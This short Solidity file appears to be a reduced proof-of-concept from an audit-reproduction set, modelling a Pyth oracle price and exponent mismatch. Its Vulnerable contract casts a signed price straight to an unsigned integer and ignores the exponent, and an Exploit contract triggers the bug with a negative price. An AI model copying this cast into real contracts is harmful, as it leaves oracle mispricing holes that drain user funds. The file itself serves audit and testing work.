// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 51982: Pyth price and exponent mismatch. Reduced local model preserves the reported state transition.

contract Vulnerable {
    int64 public storedPrice; int32 public storedExpo; uint256 public reported; function setPrice(int64 p, int32 e) external { storedPrice = p; storedExpo = e; reported = uint64(uint64(p)); }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.setPrice(-5, -2); success = bug.reported() != 5;
    }
}


